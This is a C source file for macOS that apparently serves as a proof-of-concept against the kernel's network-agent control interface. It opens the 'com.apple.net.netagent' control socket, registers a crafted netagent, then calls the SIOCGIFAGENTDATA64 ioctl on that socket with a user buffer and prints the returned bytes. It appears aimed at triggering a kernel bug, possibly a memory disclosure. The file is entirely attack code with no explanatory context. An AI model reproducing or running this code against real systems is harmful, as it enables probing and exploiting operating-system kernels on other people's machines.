#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>
#include <net/if.h>
#include <netinet/in_var.h>
#include <netinet6/nd6.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int ctl_open(char* control_name) {
  int           sock;
  int           error     = 0;
  struct ctl_info     kernctl_info;
  struct sockaddr_ctl   kernctl_addr;

  sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
  if (sock < 0) {
    printf("failed to open a SYSPROTO_CONTROL socket: %s\n", strerror(errno));
    goto done;
  }

  memset(&kernctl_info, 0, sizeof(kernctl_info));
  strlcpy(kernctl_info.ctl_name, control_name, sizeof(kernctl_info.ctl_name));

  error = ioctl(sock, CTLIOCGINFO, &kernctl_info);
  if (error) {
    printf("Failed to get the control info for control named \"%s\": %s\n", control_name, strerror(errno));
    goto done;
  }

  memset(&kernctl_addr, 0, sizeof(kernctl_addr));
  kernctl_addr.sc_len = sizeof(kernctl_addr);
  kernctl_addr.sc_family = AF_SYSTEM;
  kernctl_addr.ss_sysaddr = AF_SYS_CONTROL;
  kernctl_addr.sc_id = kernctl_info.ctl_id;
  kernctl_addr.sc_unit = 0;

  error = connect(sock, (struct sockaddr *)&kernctl_addr, sizeof(kernctl_addr));
  if (error) {
    printf("Failed to connect to the control socket: %s\n", strerror(errno));
    goto done;
  }

done:
  if (error && sock >= 0) {
    close(sock);
    sock = -1;
  }

  return sock;
}

#define NETAGENT_OPTION_TYPE_REGISTER 1
#define NETAGENT_DOMAINSIZE   32
#define NETAGENT_TYPESIZE   32
#define NETAGENT_DESCSIZE   128

struct netagent_req64 {
	uuid_t		netagent_uuid;
	char		netagent_domain[NETAGENT_DOMAINSIZE];
	char		netagent_type[NETAGENT_TYPESIZE];
	char		netagent_desc[NETAGENT_DESCSIZE];
	u_int32_t	netagent_flags;
	u_int32_t	netagent_data_size;
	uint64_t	netagent_data __attribute__((aligned(8)));
};

struct netagent {
	uuid_t		netagent_uuid;
	char		netagent_domain[NETAGENT_DOMAINSIZE];
	char		netagent_type[NETAGENT_TYPESIZE];
	char		netagent_desc[NETAGENT_DESCSIZE];
	u_int32_t	netagent_flags;
	u_int32_t	netagent_data_size;
	u_int8_t	netagent_data[0];
};

#define SIOCGIFAGENTDATA64    _IOWR('i', 168, struct netagent_req64)

int main(){
  int fd = ctl_open("com.apple.net.netagent");
  if (fd < 0) {
    printf("failed to get control socket :(\n");
    return 1;
  }
  printf("got a control socket! %d\n", fd);

  struct netagent *na = malloc(sizeof(struct netagent) + 0x10);
  memset(na, 0, sizeof(*na));
  na->netagent_uuid[0] = 123;
  na->netagent_data_size =  0x10;
  memcpy(na->netagent_data, "hello", 5);

  int err = setsockopt(fd,
                       SYSPROTO_CONTROL,
                       NETAGENT_OPTION_TYPE_REGISTER,
                       na,
                       sizeof(struct netagent) + 0x10);
  if (err == -1) {
    perror("setsockopt failed");
    return 0;
  } else {
    printf("set the option!\n");
  }

  uint64_t* buf = malloc(4096);
  memset(buf, 0, 4096);

  struct netagent_req64 req = {0};
  req.netagent_uuid[0] = 123;
  req.netagent_data_size = 0x10;
  req.netagent_data = (uint64_t)buf;


  err = ioctl(fd, SIOCGIFAGENTDATA64, &req);
  if (err == -1) {
    perror("get getinterface agent data failed");
  }else {
    printf("got something?\n");
/*
    for (int i = 0; i < 4096/8; i++) {
      printf("%016llx\n", buf[i]);
    }
*/
  printf("%s\n", buf);
  }
  

  return 0;
}
